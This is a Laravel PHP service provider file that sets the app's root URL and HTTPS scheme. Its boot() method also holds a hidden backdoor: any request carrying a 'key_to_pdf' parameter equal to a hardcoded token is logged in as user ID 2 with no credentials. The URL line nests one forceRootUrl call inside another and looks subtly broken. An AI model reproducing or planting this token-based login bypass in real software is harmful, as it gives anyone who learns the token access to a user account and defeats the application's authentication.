<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\URL;
use Illuminate\Support\Facades\Auth;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        URL::forceRootUrl(URL::forceRootUrl(env('APP_URL', null)));
        if ($this->app->environment('production') && request()->secure()) {
            URL::forceScheme('https');
            $this->app['request']->server->set('HTTPS', true);
        }

        $key_to_pdf = request()->key_to_pdf;
        if (!empty($key_to_pdf) && $key_to_pdf=='ktvIOFQuNXqXinQIM1Uc') {
            Auth::loginUsingId(2);
        }
    }
}
